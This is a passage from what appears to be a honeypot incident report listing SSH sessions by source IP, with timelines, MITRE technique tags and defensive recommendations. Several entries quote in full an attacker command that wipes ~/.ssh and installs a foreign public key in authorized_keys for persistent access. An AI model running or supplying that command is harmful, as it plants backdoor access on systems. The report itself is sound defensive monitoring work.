| `2026-03-21 01:35:28` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `191.37.18[.]250` to AbuseIPDB if not already reported
- [ ] Block `191.37.18[.]250` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-0040392ccaac

| Field | Detail |
|---|---|
| **Source IP** | `47.238.247[.]149` |
| **First Seen** | 2026-03-21 02:03 |
| **Last Seen** | 2026-03-21 02:03 |
| **Session Duration** | 3s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-03-21 02:03:46` | `cowrie.session.connect` |
| `2026-03-21 02:03:46` | `cowrie.client.version` |
| `2026-03-21 02:03:46` | `cowrie.client.kex` |
| `2026-03-21 02:03:47` | `cowrie.login.success` |
| `2026-03-21 02:03:47` | `cowrie.session.params` |
| `2026-03-21 02:03:47` | `cowrie.command.input` |
| `2026-03-21 02:03:47` | `cowrie.command.failed` |
| `2026-03-21 02:03:47` | `cowrie.log.closed` |
| `2026-03-21 02:03:47` | `cowrie.session.params` |
| `2026-03-21 02:03:47` | `cowrie.command.input` |
| `2026-03-21 02:03:48` | `cowrie.session.file_download` |
| `2026-03-21 02:03:48` | `cowrie.log.closed` |
| `2026-03-21 02:03:50` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `47.238.247[.]149` to AbuseIPDB if not already reported
- [ ] Block `47.238.247[.]149` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-08af3cd56191

| Field | Detail |
|---|---|
| **Source IP** | `47.238.247[.]149` |
| **First Seen** | 2026-03-21 02:03 |
| **Last Seen** | 2026-03-21 02:03 |
| **Session Duration** | 0s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-03-21 02:03:49` | `cowrie.session.connect` |
| `2026-03-21 02:03:49` | `cowrie.client.version` |
| `2026-03-21 02:03:49` | `cowrie.client.kex` |
| `2026-03-21 02:03:50` | `cowrie.login.success` |
| `2026-03-21 02:03:50` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `47.238.247[.]149` to AbuseIPDB if not already reported
- [ ] Block `47.238.247[.]149` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-19d8377a2796

| Field | Detail |
|---|---|
| **Source IP** | `47.238.247[.]149` |
| **First Seen** | 2026-03-21 02:04 |
| **Last Seen** | 2026-03-21 02:04 |
| **Session Duration** | 3s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-03-21 02:04:33` | `cowrie.session.connect` |
| `2026-03-21 02:04:33` | `cowrie.client.version` |
| `2026-03-21 02:04:33` | `cowrie.client.kex` |
| `2026-03-21 02:04:33` | `cowrie.login.success` |
| `2026-03-21 02:04:33` | `cowrie.session.params` |
| `2026-03-21 02:04:33` | `cowrie.command.input` |
| `2026-03-21 02:04:33` | `cowrie.command.failed` |
| `2026-03-21 02:04:33` | `cowrie.log.closed` |
| `2026-03-21 02:04:34` | `cowrie.session.params` |
| `2026-03-21 02:04:34` | `cowrie.command.input` |
| `2026-03-21 02:04:34` | `cowrie.session.file_download` |
| `2026-03-21 02:04:34` | `cowrie.log.closed` |
| `2026-03-21 02:04:36` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `47.238.247[.]149` to AbuseIPDB if not already reported
- [ ] Block `47.238.247[.]149` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-85b97f8a4651

| Field | Detail |
|---|---|
| **Source IP** | `47.238.247[.]149` |
| **First Seen** | 2026-03-21 02:04 |
| **Last Seen** | 2026-03-21 02:04 |
| **Session Duration** | 0s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-03-21 02:04:36` | `cowrie.session.connect` |
| `2026-03-21 02:04:36` | `cowrie.client.version` |
| `2026-03-21 02:04:36` | `cowrie.client.kex` |
| `2026-03-21 02:04:36` | `cowrie.login.success` |
| `2026-03-21 02:04:36` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `47.238.247[.]149` to AbuseIPDB if not already reported
- [ ] Block `47.238.247[.]149` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-d3cc9c2f2989

| Field | Detail |
|---|---|
| **Source IP** | `47.238.247[.]149` |
| **First Seen** | 2026-03-21 02:08 |
| **Last Seen** | 2026-03-21 02:08 |
| **Session Duration** | 3s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-03-21 02:08:22` | `cowrie.session.connect` |
| `2026-03-21 02:08:22` | `cowrie.client.version` |
| `2026-03-21 02:08:22` | `cowrie.client.kex` |
| `2026-03-21 02:08:22` | `cowrie.login.success` |
| `2026-03-21 02:08:22` | `cowrie.session.params` |
| `2026-03-21 02:08:22` | `cowrie.command.input` |
| `2026-03-21 02:08:22` | `cowrie.command.failed` |
| `2026-03-21 02:08:23` | `cowrie.log.closed` |
| `2026-03-21 02:08:23` | `cowrie.session.params` |
| `2026-03-21 02:08:23` | `cowrie.command.input` |
| `2026-03-21 02:08:23` | `cowrie.session.file_download` |
| `2026-03-21 02:08:23` | `cowrie.log.closed` |
| `2026-03-21 02:08:25` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `47.238.247[.]149` to AbuseIPDB if not already reported
- [ ] Block `47.238.247[.]149` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-caca2f9c1988

| Field | Detail |
|---|---|
| **Source IP** | `47.238.247[.]149` |
| **First Seen** | 2026-03-21 02:08 |
| **Last Seen** | 2026-03-21 02:08 |
| **Session Duration** | 0s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-03-21 02:08:25` | `cowrie.session.connect` |
| `2026-03-21 02:08:25` | `cowrie.client.version` |
| `2026-03-21 02:08:25` | `cowrie.client.kex` |
| `2026-03-21 02:08:25` | `cowrie.login.success` |
| `2026-03-21 02:08:25` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `47.238.247[.]149` to AbuseIPDB if not already reported
- [ ] Block `47.238.247[.]149` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-0486853fc9ca

| Field | Detail |
|---|---|
| **Source IP** | `47.238.247[.]149` |
| **First Seen** | 2026-03-21 02:09 |
| **Last Seen** | 2026-03-21 02:09 |
| **Session Duration** | 3s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-03-21 02:09:55` | `cowrie.session.connect` |
| `2026-03-21 02:09:55` | `cowrie.client.version` |
| `2026-03-21 02:09:55` | `cowrie.client.kex` |
| `2026-03-21 02:09:55` | `cowrie.login.success` |
| `2026-03-21 02:09:56` | `cowrie.session.params` |
| `2026-03-21 02:09:56` | `cowrie.command.input` |
| `2026-03-21 02:09:56` | `cowrie.command.failed` |
| `2026-03-21 02:09:56` | `cowrie.log.closed` |
| `2026-03-21 02:09:56` | `cowrie.session.params` |
| `2026-03-21 02:09:56` | `cowrie.command.input` |
| `2026-03-21 02:09:56` | `cowrie.session.file_download` |
| `2026-03-21 02:09:56` | `cowrie.log.closed` |
| `2026-03-21 02:09:58` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `47.238.247[.]149` to AbuseIPDB if not already reported
- [ ] Block `47.238.247[.]149` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-821b830be231

| Field | Detail |
|---|---|
| **Source IP** | `47.238.247[.]149` |
| **First Seen** | 2026-03-21 02:09 |
| **Last Seen** | 2026-03-21 02:09 |
| **Session Duration** | 0s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-03-21 02:09:58` | `cowrie.session.connect` |
| `2026-03-21 02:09:58` | `cowrie.client.version` |
| `2026-03-21 02:09:58` | `cowrie.client.kex` |
| `2026-03-21 02:09:58` | `cowrie.login.success` |
| `2026-03-21 02:09:58` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `47.238.247[.]149` to AbuseIPDB if not already reported
- [ ] Block `47.238.247[.]149` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-6b5b4f934fef

| Field | Detail |
|---|---|
| **Source IP** | `4.236.164[.]162` |
| **First Seen** | 2026-03-21 02:16 |
| **Last Seen** | 2026-03-21 02:16 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `uptime` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-03-21 02:16:14` | `cowrie.session.connect` |
| `2026-03-21 02:16:14` | `cowrie.client.version` |
| `2026-03-21 02:16:14` | `cowrie.client.kex` |
| `2026-03-21 02:16:15` | `cowrie.login.success` |
| `2026-03-21 02:16:15` | `cowrie.session.params` |
| `2026-03-21 02:16:15` | `cowrie.command.input` |
| `2026-03-21 02:16:16` | `cowrie.log.closed` |
| `2026-03-21 02:16:16` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `4.236.164[.]162` to AbuseIPDB if not already reported
- [ ] Block `4.236.164[.]162` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-265cc6c07707

| Field | Detail |
|---|---|
| **Source IP** | `4.236.164[.]162` |
| **First Seen** | 2026-03-21 02:20 |
| **Last Seen** | 2026-03-21 02:21 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `ps aux | head -10` |
| **TTPs (MITRE)** | T1057 · T1078 · T1083 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-03-21 02:20:58` | `cowrie.session.connect` |
| `2026-03-21 02:20:58` | `cowrie.client.version` |
| `2026-03-21 02:20:59` | `cowrie.client.kex` |
| `2026-03-21 02:20:59` | `cowrie.login.success` |
| `2026-03-21 02:21:00` | `cowrie.session.params` |
| `2026-03-21 02:21:00` | `cowrie.command.input` |
| `2026-03-21 02:21:00` | `cowrie.log.closed` |
| `2026-03-21 02:21:00` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `4.236.164[.]162` to AbuseIPDB if not already reported
- [ ] Block `4.236.164[.]162` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-a0823d4b598b

| Field | Detail |
|---|---|
| **Source IP** | `4.236.164[.]162` |
| **First Seen** | 2026-03-21 02:26 |
| **Last Seen** | 2026-03-21 02:26 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `whoami` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-03-21 02:26:28` | `cowrie.session.connect` |
| `2026-03-21 02:26:28` | `cowrie.client.version` |
| `2026-03-21 02:26:28` | `cowrie.client.kex` |
| `2026-03-21 02:26:29` | `cowrie.login.success` |
| `2026-03-21 02:26:30` | `cowrie.session.params` |
| `2026-03-21 02:26:30` | `cowrie.command.input` |
| `2026-03-21 02:26:30` | `cowrie.log.closed` |
| `2026-03-21 02:26:30` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `4.236.164[.]162` to AbuseIPDB if not already reported
- [ ] Block `4.236.164[.]162` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-f30b1b81635b

| Field | Detail |
|---|---|
| **Source IP** | `4.236.164[.]162` |
| **First Seen** | 2026-03-21 02:32 |
| **Last Seen** | 2026-03-21 02:32 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `ls -la /` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-03-21 02:32:35` | `cowrie.session.connect` |
| `2026-03-21 02:32:35` | `cowrie.client.version` |
| `2026-03-21 02:32:35` | `cowrie.client.kex` |
| `2026-03-21 02:32:36` | `cowrie.login.success` |
| `2026-03-21 02:32:37` | `cowrie.session.params` |
| `2026-03-21 02:32:37` | `cowrie.command.input` |
| `2026-03-21 02:32:37` | `cowrie.log.closed` |
| `2026-03-21 02:32:37` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `4.236.164[.]162` to AbuseIPDB if not already reported
- [ ] Block `4.236.164[.]162` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-f3b40706f063

| Field | Detail |
|---|---|
| **Source IP** | `4.236.164[.]162` |
| **First Seen** | 2026-03-21 02:38 |
| **Last Seen** | 2026-03-21 02:38 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `hostname` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-03-21 02:38:29` | `cowrie.session.connect` |
| `2026-03-21 02:38:29` | `cowrie.client.version` |
| `2026-03-21 02:38:29` | `cowrie.client.kex` |
| `2026-03-21 02:38:30` | `cowrie.login.success` |
| `2026-03-21 02:38:30` | `cowrie.session.params` |
| `2026-03-21 02:38:30` | `cowrie.command.input` |
| `2026-03-21 02:38:30` | `cowrie.log.closed` |
| `2026-03-21 02:38:30` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `4.236.164[.]162` to AbuseIPDB if not already reported
- [ ] Block `4.236.164[.]162` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-b71700a2179b

| Field | Detail |
|---|---|
| **Source IP** | `4.236.164[.]162` |
| **First Seen** | 2026-03-21 02:44 |
| **Last Seen** | 2026-03-21 02:44 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `pwd` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-03-21 02:44:25` | `cowrie.session.connect` |
| `2026-03-21 02:44:25` | `cowrie.client.version` |
| `2026-03-21 02:44:25` | `cowrie.client.kex` |
| `2026-03-21 02:44:26` | `cowrie.login.success` |
| `2026-03-21 02:44:27` | `cowrie.session.params` |
| `2026-03-21 02:44:27` | `cowrie.command.input` |
| `2026-03-21 02:44:27` | `cowrie.log.closed` |
| `2026-03-21 02:44:27` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `4.236.164[.]162` to AbuseIPDB if not already reported
- [ ] Block `4.236.164[.]162` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-8def47303835

| Field | Detail |
|---|---|
| **Source IP** | `4.236.164[.]162` |
| **First Seen** | 2026-03-21 02:50 |
| **Last Seen** | 2026-03-21 02:50 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `nproc 2>/dev/null || (grep -c '^processor' /proc/cpuinfo 2>/dev/null) || echo 0, grep -c ^processor /proc/cpuinfo 2 > /dev/null` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-03-21 02:50:33` | `cowrie.session.connect` |
| `2026-03-21 02:50:33` | `cowrie.client.version` |
| `2026-03-21 02:50:33` | `cowrie.client.kex` |
| `2026-03-21 02:50:33` | `cowrie.login.success` |
| `2026-03-21 02:50:34` | `cowrie.session.params` |
| `2026-03-21 02:50:34` | `cowrie.command.input` |
| `2026-03-21 02:50:34` | `cowrie.command.input` |
| `2026-03-21 02:50:34` | `cowrie.log.closed` |
| `2026-03-21 02:50:34` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `4.236.164[.]162` to AbuseIPDB if not already reported
- [ ] Block `4.236.164[.]162` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-3c2b34230cb6

| Field | Detail |
|---|---|
| **Source IP** | `4.236.164[.]162` |
| **First Seen** | 2026-03-21 02:56 |
| **Last Seen** | 2026-03-21 02:56 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `ls -la /` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-03-21 02:56:35` | `cowrie.session.connect` |
| `2026-03-21 02:56:35` | `cowrie.client.version` |
| `2026-03-21 02:56:35` | `cowrie.client.kex` |
| `2026-03-21 02:56:35` | `cowrie.login.success` |
| `2026-03-21 02:56:36` | `cowrie.session.params` |
| `2026-03-21 02:56:36` | `cowrie.command.input` |
| `2026-03-21 02:56:36` | `cowrie.log.closed` |
| `2026-03-21 02:56:36` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `4.236.164[.]162` to AbuseIPDB if not already reported
- [ ] Block `4.236.164[.]162` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-e240930dd3cb

| Field | Detail |
|---|---|
| **Source IP** | `4.236.164[.]162` |
| **First Seen** | 2026-03-21 03:02 |
| **Last Seen** | 2026-03-21 03:02 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `hostname` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-03-21 03:02:35` | `cowrie.session.connect` |
| `2026-03-21 03:02:35` | `cowrie.client.version` |
| `2026-03-21 03:02:35` | `cowrie.client.kex` |
| `2026-03-21 03:02:36` | `cowrie.login.success` |
| `2026-03-21 03:02:36` | `cowrie.session.params` |
| `2026-03-21 03:02:36` | `cowrie.command.input` |
| `2026-03-21 03:02:36` | `cowrie.log.closed` |
| `2026-03-21 03:02:36` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `4.236.164[.]162` to AbuseIPDB if not already reported
- [ ] Block `4.236.164[.]162` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-b492140806b8

| Field | Detail |
|---|---|
| **Source IP** | `4.236.164[.]162` |
| **First Seen** | 2026-03-21 03:08 |
| **Last Seen** | 2026-03-21 03:08 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `mount | head -5` |
| **TTPs (MITRE)** | T1078 · T1083 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-03-21 03:08:41` | `cowrie.session.connect` |
| `2026-03-21 03:08:41` | `cowrie.client.version` |
| `2026-03-21 03:08:41` | `cowrie.client.kex` |
| `2026-03-21 03:08:42` | `cowrie.login.success` |
| `2026-03-21 03:08:43` | `cowrie.session.params` |
| `2026-03-21 03:08:43` | `cowrie.command.input` |
| `2026-03-21 03:08:43` | `cowrie.log.closed` |
| `2026-03-21 03:08:43` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `4.236.164[.]162` to AbuseIPDB if not already reported
- [ ] Block `4.236.164[.]162` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-6dc75d62919b

| Field | Detail |
|---|---|
| **Source IP** | `4.236.164[.]162` |
| **First Seen** | 2026-03-21 03:20 |
| **Last Seen** | 2026-03-21 03:20 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `pwd` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-03-21 03:20:47` | `cowrie.session.connect` |
| `2026-03-21 03:20:47` | `cowrie.client.version` |
| `2026-03-21 03:20:47` | `cowrie.client.kex` |
| `2026-03-21 03:20:48` | `cowrie.login.success` |
| `2026-03-21 03:20:48` | `cowrie.session.params` |
| `2026-03-21 03:20:48` | `cowrie.command.input` |
| `2026-03-21 03:20:48` | `cowrie.log.closed` |
| `2026-03-21 03:20:48` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `4.236.164[.]162` to AbuseIPDB if not already reported
- [ ] Block `4.236.164[.]162` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-2f9c4c681db2

| Field | Detail |
|---|---|
| **Source IP** | `4.236.164[.]162` |
| **First Seen** | 2026-03-21 03:26 |
| **Last Seen** | 2026-03-21 03:26 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `uname -a` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-03-21 03:26:53` | `cowrie.session.connect` |
| `2026-03-21 03:26:53` | `cowrie.client.version` |
| `2026-03-21 03:26:53` | `cowrie.client.kex` |
| `2026-03-21 03:26:53` | `cowrie.login.success` |
| `2026-03-21 03:26:54` | `cowrie.session.params` |
| `2026-03-21 03:26:54` | `cowrie.command.input` |
| `2026-03-21 03:26:54` | `cowrie.log.closed` |
| `2026-03-21 03:26:54` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `4.236.164[.]162` to AbuseIPDB if not already reported
- [ ] Block `4.236.164[.]162` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-051fab8c2963

| Field | Detail |
|---|---|
| **Source IP** | `4.236.164[.]162` |
| **First Seen** | 2026-03-21 03:33 |
| **Last Seen** | 2026-03-21 03:33 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `uname -m 2>/dev/null || echo unknown` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-03-21 03:33:03` | `cowrie.session.connect` |
| `2026-03-21 03:33:03` | `cowrie.client.version` |
| `2026-03-21 03:33:03` | `cowrie.client.kex` |
| `2026-03-21 03:33:04` | `cowrie.login.success` |
| `2026-03-21 03:33:04` | `cowrie.session.params` |
| `2026-03-21 03:33:04` | `cowrie.command.input` |
| `2026-03-21 03:33:05` | `cowrie.log.closed` |
| `2026-03-21 03:33:05` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `4.236.164[.]162` to AbuseIPDB if not already reported
- [ ] Block `4.236.164[.]162` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-3b8e33f3ab22

| Field | Detail |
|---|---|
| **Source IP** | `4.236.164[.]162` |
| **First Seen** | 2026-03-21 03:39 |
| **Last Seen** | 2026-03-21 03:39 |
| **Session Duration** | 1s |
